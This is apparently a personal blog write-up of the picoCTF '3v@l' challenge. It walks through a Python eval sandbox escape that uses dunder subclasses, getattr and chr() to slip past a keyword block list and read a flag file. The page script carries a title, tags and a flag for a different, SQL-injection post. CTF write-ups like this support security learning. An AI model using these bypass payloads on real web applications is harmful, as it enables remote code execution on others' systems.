@@ -1,1 +1,353 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <meta name="description" content="The Offsec Journal - My journey from a script kiddie to a security researcher">
+  <meta name="author" content="Aditya Bhardwaj">
+  
+  <title>The Offsec Journal | [POST TITLE]</title>
+  
+  <link rel="stylesheet" href="pico.green.min.css">
+  
+  <style>
+    /* Custom styling for code blocks and technical content */
+    :root {
+      --pico-font-family-monospace: 'Courier New', Courier, monospace;
+    }
+    
+    pre {
+      background-color: #1a1a1a;
+      border-left: 4px solid var(--pico-primary);
+      padding: 1rem;
+      overflow-x: auto;
+    }
+    
+    code {
+      background-color: #2a2a2a;
+      padding: 0.2rem 0.4rem;
+      border-radius: 3px;
+      font-size: 0.9em;
+    }
+    
+    pre code {
+      background-color: transparent;
+      padding: 0;
+    }
+    
+    .post-meta {
+      color: var(--pico-muted-color);
+      font-size: 0.9rem;
+      margin-bottom: 2rem;
+    }
+    
+    .tag {
+      display: inline-block;
+      background-color: var(--pico-primary-background);
+      color: var(--pico-primary-inverse);
+      padding: 0.25rem 0.75rem;
+      border-radius: 1rem;
+      font-size: 0.85rem;
+      margin-right: 0.5rem;
+      margin-bottom: 0.5rem;
+    }
+    
+    .toc {
+      background-color: #1a1a1a;
+      padding: 1.5rem;
+      border-radius: 0.5rem;
+      margin-bottom: 2rem;
+    }
+    
+    .toc h3 {
+      margin-top: 0;
+    }
+    
+    .toc ul {
+      margin-bottom: 0;
+    }
+    
+    blockquote {
+      border-left: 4px solid var(--pico-primary);
+      padding-left: 1rem;
+      font-style: italic;
+      color: var(--pico-muted-color);
+    }
+    
+    img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 0.5rem;
+      margin: 1rem 0;
+    }
+    
+    .footer {
+      margin-top: 4rem;
+      padding-top: 2rem;
+      border-top: 1px solid var(--pico-muted-border-color);
+      text-align: center;
+      color: var(--pico-muted-color);
+    }
+  </style>
+</head>
 
+<body>
+  <nav class="container">
+    <ul>
+      <li><strong>The Offsec Journal</strong></li>
+    </ul>
+    <ul>
+      <li><a href="/">Home</a></li>
+      <li><a href="/about.html">About</a></li>
+    </ul>
+  </nav>
+
+  <main class="container">
+    <article>
+      <!-- Post Header -->
+      <header>
+        <h1 id="bigtitle"></h1>
+        <div class="post-meta">
+          <time id="date"></time> 
+        </div>
+        <div id="tags"></div>
+      </header>
+    
+      <!-- Table of Contents -->
+      <aside class="toc">
+        <h3>Table of Contents</h3>
+        <ul id="toc_ul"></ul>
+      </aside>
+    
+      <!-- Introduction -->
+      <section>
+        <h2>Introduction</h2>
+        <p>Hi there! This was another fun one. Note: like Crack the Gate 2, I completed this multiple months ago, probably some time in March. It's been a minute—this writeup may or may not be a little jank. Don't say I didn't warn you, lol.</p>
+        
+        <p>The challenge description was short and immediately obvious about what was going on:</p>
+        <blockquote>
+          "ABC Bank's website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank. Unfortunately, they are using an eval function to calculate the loan."
+        </blockquote>
+        
+        <p>
+          <strong>Challenge Name:</strong> 3v@l<br>
+          <strong>Platform:</strong> picoCTF 2026<br>
+          <strong>Difficulty:</strong> Medium<br>
+          <strong>Category:</strong> Web Exploitation
+        </p>
+        
+        <p>
+          RCE time. The word "eval" in a web app was basically a neon sign that says "please inject arbitrary code here." The real question wasn't <i>whether</i> that was exploitable, but rather <i>how</i>, given that someone had clearly tried to put up some defenses. It was only a matter of time.
+        </p>
+      </section><br>
+    
+      <!-- Recon -->
+      <section class="blog-section">
+        <h2 class="sectheading"></h2>
+
+        <h4>Gobuster and a Fun HTML Comment</h4>
+        
+        <p>Ran a quick gobuster scan first out of habit:</p>
+
+        <pre><code>gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt</code></pre>
+
+        <p>I did find one interesting result: <code>/console</code>, returning a 400. Weird—made note of it and moved on. It wasn't reachable, so there probably wasn't much I could do with it, but might be worth remembering.</p>
+
+        <p>Loading the app itself, I noticed that the page source came with a complimentary copy of the dev's to-do list:</p>
+
+        <pre><code>&lt;!--
+    TODO
+    ------------
+    Secure python_flask eval execution by
+        1. blocking malicious keywords like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
+        2. Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
+--&gt;</code></pre>
+
+        <p>Let me say that again: the developer had accidentally left their entire security plan in a conveniently-placed HTML comment. I now knew exactly which keywords were blocked and exactly which regex patterns were being applied. The word "implementing" in that comment also raised a pretty important question—were they even finished with this part yet?</p>
+
+        <h4>Oh, It's Just Python</h4>
+        <p>The app had a textarea whose contents were being POSTed to <code>/evaluate</code>, with a placeholder suggesting a loan formula like <code>PRT*RATE*TIME(10000*23*12)</code>. I tried that and got back:</p>
+
+        <pre><code>Result: Error: name 'PRT' is not defined</code></pre>
+
+        <p>That error message was telling. The backend wasn't evaluating some custom formula language—that thing was running <i>straight Python</i> and sending the interpreter's error messages right back to us. I tried:</p>
+
+        <pre><code>print('gotcha?')</code></pre>
+
+        <p>Result: <code>None</code>. Python's <code>print()</code> statement always returns <code>None</code>. So this really is just raw Python <code>eval()</code>. Yay.</p>
+      </section><br>
+      
+      <!-- mapping the filters -->
+      <section class="blog-section">
+        <h2 class="sectheading"></h2>
+                
+        <p>Before I tried to break anything, I needed to understand what exactly the filters were actually doing. The TODO gave me a pretty good idea, so I started testing each piece one by one.</p>
+
+        <h4>Keywords</h4>
+        
+        <p>Trying <code>os</code> returned:</p>
+
+        <pre><code>Error: Detected forbidden keyword 'os'.</code></pre>
+
+        <p>Ok, so keyword blocking was working. But the list they planned to block was pretty specific: <code>os, eval, exec, bind, connect, python, socket, ls, cat, shell</code>. They missed a spot—more on that in a moment.</p>
+
+        
+        <h4>The Regex</h4>
+        
+        <p>The regex looked like it was supposed to block hex values, unicode escapes, URL encoding, file extensions, slashes, and <code>..</code>. Testing each pattern directly in the input showed they were actually just being removed rather than outright rejected—the response came back as <code>Error: Detected forbidden keyword ''.</code> An empty string—the pattern was just being stripped out. Ok, interesting.</p>
+
+        <p>What I found out was that there was one crucial thing missing from both the keyword list and the regex: <strong>underscores</strong>. If you're trying to secure a Python <code>eval()</code> and you forget to block underscores, you've kinda left the front door unlocked.</p>
+
+        <p>Python's whole object model is accessible through dunder (double underscore) attributes: if underscores work, there's suddenly an entire class of payloads now available. I tried <code>''.__class__</code> and got back... absolutely nothing? But in Burp Suite, the raw response showed:</p>
+
+        <pre><code>Result: &lt;class 'str'&gt;</code></pre>
+
+        <p>The result was there, but the greater-than and less-than in the response were being interpreted as HTML tags by the browser, and then failing to render. Burp Suite saved me from missing that entirely—one more reason that Burp is simply <i>awesome</i>.</p>
+      </section><br>
+
+      <!-- exploitation -->
+      <section class="blog-section">
+        <h2 class="sectheading"></h2>
+        
+        <h4>Escaping the Python Sandbox with Subclasses</h4>
+        <p>With underscores working and the response visible in Burp, I ran the classic Python sandbox payload to get a list of my available subclasses:</p>
+
+        <pre><code>''.__class__.__mro__[1].__subclasses__()</code></pre>
+
+        <p>The first part of that, <code>''.__class__.__mro__</code>, references the inheritance tree for the <code>str</code> class; at index 1 of that tree is the <code>object</code> class. Then, the call to object's <code>__subclasses__()</code> lists every class that inherits from it. In other words, since the method was called on the <code>object</code> class, it lists out every class available for us to mess with—which in a Flask app running with subprocess support includes things like <code>subprocess.Popen</code>. I found it at index 356.</p>
+
+        <p>Now I needed to figure out how to run a shell command. The obvious attempt:</p>
+
+        <pre><code>''.__class__.__mro__[1].__subclasses__()[356]('ls', stdout=-1).communicate()[0]</code></pre>
+
+        <p>Blocked—<code>ls</code> is on the forbidden keyword list. Ok, suit yourself.</p>
+
+        <pre><code>''.__class__.__mro__[1].__subclasses__()[356]('l' + 's', stdout=-1).communicate()[0]</code></pre>
+
+        <p>Blocked again, this time for <code>cat</code>. But I wasn't using <code>cat</code>... oh. <code>communiCATe</code>. Touché. The filter was case-insensitive, and it was just matching substrings. I had to find a way to split up the method name too.</p>
+        
+        <p>Eventually, after some intense googling, I figured out I could use <code>getattr()</code> to call the method by a split string instead of dot notation:</p>
+
+        <pre><code>(getattr(''.__class__.__mro__[1].__subclasses__()[356](['l' + 's'], stdout=-1), 'communica' + 'te'))()</code></pre>
+
+        <pre><code>Result: b'app.py\nstatic\ntemplates\n'</code></pre>
+
+        <p>Success!</p>
+
+        
+        <h4>Getting a Slash</h4>
+        <p>Now I needed to navigate the filesystem, but slashes were blocked by the regex. My first idea (for <i>some</i> reason) was to run <code>ls -aF</code>, which appends <code>/</code> to directory names in its output, and harvest the slash character from the resulting bytes:</p>
+
+        <pre><code>(getattr(''.__class__.__mro__[1].__subclasses__()[356](['l' + 's', '-aF'], stdout=-1), 'communica' + 'te'))()[0]</code></pre>
+
+        <pre><code>b'./\n../\napp.py\nstatic/\ntemplates/\n'</code></pre>
+
+        <p>Index <code>[1]</code> of that byte string is the <code>/</code> character; now I had an expression that I could use to create slashes in order to navigate the filesystem. I tried building a command that used that harvested slash, but it turned into complete spaghetti that threw a syntax error. I still don't know why—all of the pieces of the command worked on their own with no error. Putting them together somehow broke the whole thing. Funnnnnnn.</p>
+
+        <p>But then it hit me: <code>chr()</code> exists. Python already has a built-in function that converts an integer to a character. I didn't need to harvest anything from anywhere—I could've just done that from the very beginning.</p>
+
+        <pre><code>(getattr(''.__class__.__mro__[1].__subclasses__()[356](['l' + 's', chr(47)], stdout=-1), 'communica' + 'te'))()[0]</code></pre>
+
+        <pre><code>Result: b'app\nbin\nboot\nchallenge\ndev\netc\nflag.txt\nhome\n...'</code></pre>
+
+        <p>Oh hey, <code>flag.txt</code>, just chilling in the root directory.</p>
+
+        <h4>Reading the Flag</h4>
+        <p>I used the same tricks: splitting <code>cat</code>, using <code>chr(47)</code> for the slash, <code>chr(46)</code> for the dot in <code>.txt</code>. The final payload was a little something like this:</p>
+
+        <pre><code>(getattr(''.__class__.__mro__[1].__subclasses__()[356](['ca' + 't', chr(47)+"flag"+chr(46)+"txt"], stdout=-1), 'communica' + 'te'))()[0]</code></pre>
+
+        <p>Flag. Woohoo</p>
+      </section><br>
+      
+      <!-- Lessons Learned -->
+      <section class="blog-section">
+        <h2 class="sectheading"></h2>
+        
+        <p>
+          This one took longer than it should have, mostly because the spaghetti slash-harvesting detour cost me a solid chunk of time. But the core technique was genuinely satisfying to work through, and it was exactly what TryHackMe had been teaching me to do over and over again.
+        </p>
+
+        <h4>Key Takeaways</h4>
+        <ul>
+          <li><strong>Forgetting to block underscores in a Python sandbox is one hell of a blunder.</strong> Python's dunder attribute chain is literally the textbook approach to escaping eval() sandboxes; if underscores aren't blocked, the sandbox isn't really a sandbox anymore.</li>
+          <li><strong>chr() exists. </strong> Can't forget about it. Just because it was blocked for one box I'd done before didn't mean it would be blocked for all of them.</li>
+          <li><strong>Burp Suite is king.</strong> Always check the raw response—that bit took me a while to figure out.</li>
+          <li><strong>Don't let your payload get so messy that not even <i>you</i> understand it anymore.</strong> The nested slash-harvesting approach technically worked, but it was a maintenance nightmare—there was just too much going on. More complex isn't usually better.</li>
+        </ul>
+
+        <h3>What I'd Do Differently</h3>
+        <p>I should have thought of <code>chr()</code> way earlier. The slash problem showed up immediately after I confirmed RCE, and I went down an hour-long rabbit hole building a nested payload that somehow grew a mind of its own—when the clean (and probably the <i>intended</i>) solution was right there in Python's standard library. Getting creative is good, but remembering the basics is still nonnegotiable.</p>
+
+        <p>Maybe I'll remember next time.</p>
+      </section><br>
+    
+      <!-- Flags -->
+      <div id="flagbool"></div><br>
+
+      <h3>Cheers!</h3>
+    </article>
+
+    <!-- Footer -->
+    <footer class="footer">
+      <p>
+        © 2025 ADITYA BHARDWAJ | <a href="mailto:adib334@outlook.com">Email</a>
+      </p>
+      <p><small>All writeups are for educational & documentation purposes only. Happy hacking!</small></p>
+    </footer>
+  </main>
+
+  <script>
+    // Variables for specifically this blog post
+
+    const TITLE = "Startup Company - Gotta Love SQLi(te)";
+    const DATE = "2026-06-07";
+    const TAGS = ["picoCTF", "Web Exploitation", "SQLi", "SQLite", "Medium"];
+    const SECTIONS = ["Recon", "The Injection Point", "Exploitation", "Lessons Learned"];
+    const FLAGS = {
+      user: null,
+      root: "picoCTF{1_c4nn0t_s33_y0u_58183fce}"
+    };
+    
+    
+    let tagsDiv = document.querySelector("div#tags"); let tocUl = document.querySelector("ul#toc_ul");
+    
+    if (SECTIONS.length) {
+      SECTIONS.forEach(section => {
+        tocUl.insertAdjacentHTML(
+          "beforeend",
+          `<li><a class="sectlink" href="#${section.toLowerCase().replace(/\s+/g, "_").replace(/\p{P}/gu, "")}">${section}</a></li>`
+        );
+      });
+    }
+
+    TAGS.forEach(tag => tagsDiv.innerHTML += `<span class="tag">${tag}</span>` );
+
+    document.querySelector("title").innerText = `The Offsec Journal | ${TITLE}`;
+    document.querySelector("h1#bigtitle").innerText = TITLE;
+    
+    document.querySelector("time#date").setAttribute("datetime", DATE);
+    document.querySelector("time#date").textContent = new Date(DATE).toLocaleString("en-US", { dateStyle: "long", timeZone: "UTC" });
+    
+    document.querySelectorAll("section.blog-section").forEach((s, i) => { if (SECTIONS[i]) s.id = SECTIONS[i].toLowerCase().replace(/\s+/g, "_").replace(/\p{P}/gu, "") });
+    document.querySelectorAll("h2.sectheading").forEach((s, i) => { if (SECTIONS[i]) s.innerText = SECTIONS[i] });
+
+
+    if (FLAGS) {
+      const flagLines = [];
+      if (FLAGS.user) flagLines.push(`User Flag: ${FLAGS.user}`);
+      if (FLAGS.root) flagLines.push(`Root Flag: ${FLAGS.root}`);
+      
+      const flagText = flagLines.join("\n");
+      
+      document.querySelector("div#flagbool").innerHTML = `<section id="flags">
+          <details>
+            <summary><strong>Flags (Click to Reveal)</strong></summary>
+            <pre><code>${flagText}</code></pre>
+          </details>
+        </section><br>`;
+    }
+  </script>
+</body>
+</html>
